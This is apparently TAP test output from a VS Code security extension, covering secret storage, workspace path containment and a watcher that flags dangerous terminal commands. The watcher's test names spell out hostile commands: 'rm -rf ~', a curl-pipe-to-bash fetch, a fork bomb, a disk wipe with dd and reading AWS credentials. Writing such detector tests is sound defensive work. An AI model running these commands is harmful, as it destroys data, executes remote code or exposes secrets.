+  ---
+  duration_ms: 2.5373
+  type: 'suite'
+  ...
+# Subtest: SecretReferenceManager — swappable value store (SecretStorage boundary)
+    # Subtest: stores raw values only in the injected store, never in the record map
+    ok 1 - stores raw values only in the injected store, never in the record map
+      ---
+      duration_ms: 1.3576
+      type: 'test'
+      ...
+    # Subtest: one-time ref cannot be used twice even under concurrent lookups (no TOCTOU double-spend)
+    ok 2 - one-time ref cannot be used twice even under concurrent lookups (no TOCTOU double-spend)
+      ---
+      duration_ms: 0.952
+      type: 'test'
+      ...
+    1..2
+ok 138 - SecretReferenceManager — swappable value store (SecretStorage boundary)
+  ---
+  duration_ms: 2.6728
+  type: 'suite'
+  ...
+# Subtest: extension security benchmark evidence
+    # Subtest: uses a balanced, unique, multi-surface corpus
+    ok 1 - uses a balanced, unique, multi-surface corpus
+      ---
+      duration_ms: 3.2617
+      type: 'test'
+      ...
+    # Subtest: contains only explicit synthetic fixtures and no private-key body
+    ok 2 - contains only explicit synthetic fixtures and no private-key body
+      ---
+      duration_ms: 1.0373
+      type: 'test'
+      ...
+    # Subtest: publishes machine-readable results with honest scope
+    ok 3 - publishes machine-readable results with honest scope
+      ---
+      duration_ms: 51.967
+      type: 'test'
+      ...
+    1..3
+ok 139 - extension security benchmark evidence
+  ---
+  duration_ms: 60.5999
+  type: 'suite'
+  ...
+# Subtest: sensitive-file list has not been re-forked
+    # Subtest: no extension module re-declares the secret-file globs
+    ok 1 - no extension module re-declares the secret-file globs
+      ---
+      duration_ms: 177.8407
+      type: 'test'
+      ...
+    # Subtest: the proactive guards import the canonical list
+    ok 2 - the proactive guards import the canonical list
+      ---
+      duration_ms: 5.9143
+      type: 'test'
+      ...
+    1..2
+ok 140 - sensitive-file list has not been re-forked
+  ---
+  duration_ms: 194.438
+  type: 'suite'
+  ...
+# Subtest: a command that starts in the integrated terminal is examined
+    # Subtest: treats "rm -rf ~" as critical
+    ok 1 - treats "rm -rf ~" as critical
+      ---
+      duration_ms: 26.956
+      type: 'test'
+      ...
+    # Subtest: treats "curl https://example.test/i.sh | bash" as critical
+    ok 2 - treats "curl https://example.test/i.sh | bash" as critical
+      ---
+      duration_ms: 5.1539
+      type: 'test'
+      ...
+    # Subtest: treats ":(){ :|:& };:" as critical
+    ok 3 - treats ":(){ :|:& };:" as critical
+      ---
+      duration_ms: 3.2906
+      type: 'test'
+      ...
+    # Subtest: treats "dd if=/dev/zero of=/dev/sda" as critical
+    ok 4 - treats "dd if=/dev/zero of=/dev/sda" as critical
+      ---
+      duration_ms: 0.6847
+      type: 'test'
+      ...
+    # Subtest: flags "cat ~/.aws/credentials" without calling it critical
+    ok 5 - flags "cat ~/.aws/credentials" without calling it critical
+      ---
+      duration_ms: 0.8493
+      type: 'test'
+      ...
+    # Subtest: flags "docker run --privileged ubuntu" without calling it critical
+    ok 6 - flags "docker run --privileged ubuntu" without calling it critical
+      ---
+      duration_ms: 1.7345
+      type: 'test'
+      ...
+    # Subtest: flags "kubectl delete namespace prod" without calling it critical
+    ok 7 - flags "kubectl delete namespace prod" without calling it critical
+      ---
+      duration_ms: 1.1465
+      type: 'test'
+      ...
+    # Subtest: stays silent for "npm test"
+    ok 8 - stays silent for "npm test"
+      ---
+      duration_ms: 1.517
+      type: 'test'
+      ...
+    # Subtest: stays silent for "git status"
+    ok 9 - stays silent for "git status"
+      ---
+      duration_ms: 1.0897
+      type: 'test'
+      ...
+    # Subtest: stays silent for "ls -la src"
+    ok 10 - stays silent for "ls -la src"
+      ---
+      duration_ms: 2.229
+      type: 'test'
+      ...
+    # Subtest: says nothing about an empty or whitespace command line
+    ok 11 - says nothing about an empty or whitespace command line
+      ---
+      duration_ms: 0.5099
+      type: 'test'
+      ...
+    # Subtest: never puts a raw credential in the evidence it reports
+    ok 12 - never puts a raw credential in the evidence it reports
+      ---
+      duration_ms: 0.9341
+      type: 'test'
+      ...
+    1..12
+ok 141 - a command that starts in the integrated terminal is examined
+  ---
+  duration_ms: 55.5894
+  type: 'suite'
+  ...
+# Subtest: suppression cannot silence a critical detection
+    # Subtest: notifies on critical even when the user dismissed the advisory notice
+    ok 1 - notifies on critical even when the user dismissed the advisory notice
+      ---
+      duration_ms: 0.6474
+      type: 'test'
+      ...
+    # Subtest: notifies on every critical execution, not once per session
+    ok 2 - notifies on every critical execution, not once per session
+      ---
+      duration_ms: 0.5482
+      type: 'test'
+      ...
+    # Subtest: respects suppression for the lower-severity advisory
+    ok 3 - respects suppression for the lower-severity advisory
+      ---
+      duration_ms: 0.3532
+      type: 'test'
+      ...
+    # Subtest: stays quiet for a clean command whatever the flags say
+    ok 4 - stays quiet for a clean command whatever the flags say
+      ---
+      duration_ms: 0.506
+      type: 'test'
+      ...
+    1..4
+ok 142 - suppression cannot silence a critical detection
+  ---
+  duration_ms: 2.7447
+  type: 'suite'
+  ...
+# Subtest: the claim this feature makes
+    # Subtest: is MONITORED, because the shell has already started
+    ok 1 - is MONITORED, because the shell has already started
+      ---
+      duration_ms: 0.5247
+      type: 'test'
+      ...
+    # Subtest: says in its own words that it detects rather than prevents
+    ok 2 - says in its own words that it detects rather than prevents
+      ---
+      duration_ms: 1.276
+      type: 'test'
+      ...
+    1..2
+ok 143 - the claim this feature makes
+  ---
+  duration_ms: 2.4782
+  type: 'suite'
+  ...
+# Subtest: the watcher is wired to the real editor event
+    # Subtest: subscribes to onDidStartTerminalShellExecution
+    ok 1 - subscribes to onDidStartTerminalShellExecution
+      ---
+      duration_ms: 0.5312
+      type: 'test'
+      ...
+    # Subtest: feature-detects it, because the `^1.85.0` floor predates the API
+    ok 2 - feature-detects it, because the `^1.85.0` floor predates the API
+      ---
+      duration_ms: 0.9223
+      type: 'test'
+      ...
+    # Subtest: reads the command line through the shell-integration accessor
+    ok 3 - reads the command line through the shell-integration accessor
+      ---
+      duration_ms: 0.4401
+      type: 'test'
+      ...
+    # Subtest: is registered during activation
+    ok 4 - is registered during activation
+      ---
+      duration_ms: 1.4198
+      type: 'test'
+      ...
+    1..4
+ok 144 - the watcher is wired to the real editor event
+  ---
+  duration_ms: 4.1613
+  type: 'suite'
+  ...
+# Subtest: Workspace path containment policy
+    # Subtest: allows a file below the workspace root
+    ok 1 - allows a file below the workspace root
+      ---
+      duration_ms: 5.3668
+      type: 'test'
+      ...
+    # Subtest: rejects parent traversal outside the workspace
+    ok 2 - rejects parent traversal outside the workspace
+      ---
+      duration_ms: 0.682
+      type: 'test'
+      ...
+    # Subtest: rejects a sibling with a shared textual prefix
+    ok 3 - rejects a sibling with a shared textual prefix
+      ---
+      duration_ms: 0.7191
+      type: 'test'
+      ...
+    # Subtest: allows separate files within each multi-root workspace independently
+    ok 4 - allows separate files within each multi-root workspace independently
+      ---
+      duration_ms: 0.8993
+      type: 'test'
+      ...
+    1..4
+ok 145 - Workspace path containment policy
+  ---
+  duration_ms: 12.6912
+  type: 'suite'
+  ...
+# Subtest: Workspace filesystem path policy
+    # Subtest: allows a normal existing workspace file and a normal output
+    ok 1 - allows a normal existing workspace file and a normal output
+      ---
+      duration_ms: 210.369
+      type: 'test'
+      ...
+    # Subtest: rejects a symlink to a file outside the workspace
+    ok 2 - rejects a symlink to a file outside the workspace # SKIP symlink unavailable: Error: EPERM: operation not permitted, symlink 'C:\\Users\\USER\\AppData\\Local\\Temp\\soterai-link-0RCafZ\\outside.env' -> 'C:\\Users\\USER\\AppData\\Local\\Temp\\soterai-link-0RCafZ\\workspace\\.env'
+      ---
+      duration_ms: 158.2729
+      type: 'test'
+      ...
+    # Subtest: rejects an internal symlink and a symlinked output target
+    ok 3 - rejects an internal symlink and a symlinked output target # SKIP symlink unavailable: Error: EPERM: operation not permitted, symlink 'C:\\Users\\USER\\AppData\\Local\\Temp\\soterai-internal-link-o4zrvv\\source.env' -> 'C:\\Users\\USER\\AppData\\Local\\Temp\\soterai-internal-link-o4zrvv\\.env'
+      ---
+      duration_ms: 50.0502
+      type: 'test'
+      ...
+    # Subtest: rejects a Windows directory junction
+    ok 4 - rejects a Windows directory junction
+      ---
+      duration_ms: 114.1949
+      type: 'test'
+      ...
+    1..4
+ok 146 - Workspace filesystem path policy
+  ---
+  duration_ms: 535.4159
+  type: 'suite'
+  ...
+1..146
+# tests 494
+# suites 106
+# pass 487
+# fail 5
+# cancelled 0
+# skipped 2
+# todo 0
+# duration_ms 25552.9565
